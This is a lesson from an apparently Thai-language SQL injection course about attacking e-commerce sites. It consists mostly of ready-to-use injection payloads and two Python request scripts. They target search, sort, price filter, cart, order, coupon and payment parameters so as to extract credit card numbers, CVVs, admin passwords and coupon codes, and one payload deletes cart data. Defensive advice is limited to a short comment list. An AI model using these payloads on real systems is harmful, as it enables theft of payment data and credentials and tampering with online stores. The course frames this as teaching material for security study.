# Part 072: SQL Injection ใน E-Commerce

## ภาพรวม

E-Commerce platforms มีจุด injection ที่หลากหลาย

**ขั้นตอนที่ 1151-1165**

---

## 1151. Product Search SQLi

```sql
-- /products/search?q=phone&category=1&sort=price

-- Search term injection:
phone' UNION SELECT 1,product_name,price,4 FROM products--
phone' AND '1'='2' UNION SELECT 1,credit_card_number,3,4 FROM orders--

-- Category injection:
1 UNION SELECT 1,username,password,4 FROM admins--
1 AND 1=2 UNION SELECT 1,2,3,4-- -

-- Sort injection (ORDER BY):
-- ถ้า sort parameter ใช้ตรงๆ:
GET /products?sort=price ASC, (SELECT SLEEP(3))-- -
GET /products?sort=(CASE WHEN (1=1) THEN price ELSE name END)
```

---

## 1152. Product Filter/Price Range

```python
import requests

# /products?min_price=100&max_price=500
# vulnerable: WHERE price BETWEEN $min AND $max

def test_price_sqli(url: str):
    payloads = [
        # max_price injection
        {'min_price': '0', 'max_price': '999 UNION SELECT 1,password,3,4 FROM users--'},
        {'min_price': '0', 'max_price': '999 AND SLEEP(3)--'},
        # min_price injection  
        {'min_price': '0 OR 1=1--', 'max_price': '999'},
        # BETWEEN bypass
        {'min_price': '-1', 'max_price': '99999'},
    ]
    
    for params in payloads:
        r = requests.get(url, params=params, timeout=8)
        print(f"{params} -> {r.status_code} ({len(r.text)} bytes)")
```

---

## 1153. Cart และ Order SQLi

```sql
-- /cart/add (POST): product_id=5&quantity=2
-- vulnerable: INSERT INTO cart (product_id, qty) VALUES ($id, $qty)

-- Quantity injection (INSERT):
quantity=2, (SELECT password FROM users LIMIT 1)-- -

-- product_id injection:
product_id=5); DELETE FROM cart WHERE '1'='1

-- /order/status?order_id=12345
-- UNION-based:
order_id=12345 UNION SELECT 1,card_number,cvv,4 FROM payments--
```

---

## 1154. Discount/Coupon SQLi

```sql
-- /apply-coupon (POST): coupon_code=SAVE10
-- vulnerable: SELECT * FROM coupons WHERE code='$code'

-- Auth bypass:
coupon_code=' OR 1=1 LIMIT 1-- -

-- UNION เพื่อหา admin coupons:
coupon_code=' UNION SELECT 1,'FREESHIP','100%',99999,'2099-12-31'-- -

-- Error-based:
coupon_code=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(code) FROM coupons)))-- -

-- ผล: ได้รายชื่อ coupon ที่มีอยู่ทั้งหมด
```

---

## 1155. Payment Gateway SQLi

```python
# คำเตือน: อย่า test payment gateway โดยไม่ได้รับอนุญาต

import requests

def test_payment_sqli(url: str):
    payloads = [
        {'amount': "100.00' OR '1'='1"},
        {'card_number': "4111111111111111' UNION SELECT 1,2,3,4-- -"},
        {'order_id': "1 AND SLEEP(3)-- -"},
        {'transaction_id': "xxx' OR 1=1-- -"},
    ]
    
    for data in payloads:
        r = requests.post(url, data=data, timeout=8)
        if 'error' in r.text.lower() or 'sql' in r.text.lower():
            print(f"[+] SQLi in payment: {data}")

# ป้องกัน:
# 1. ใช้ parameterized queries ทุกจุด
# 2. Input validation (amount = decimal, card = digits only)
# 3. Log และ alert transactions ผิดปกติ
# 4. ใช้ payment SDK ที่น่าเชื่อถือ
```

---

## สรุป

E-Commerce SQL Injection:
- **Search** - product name, category, sort
- **Price filter** - BETWEEN injection
- **Cart/Order** - INSERT/SELECT injection
- **Coupon** - bypass discount validation
- **Payment** - amount, card, transaction fields

---

*Part 072 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
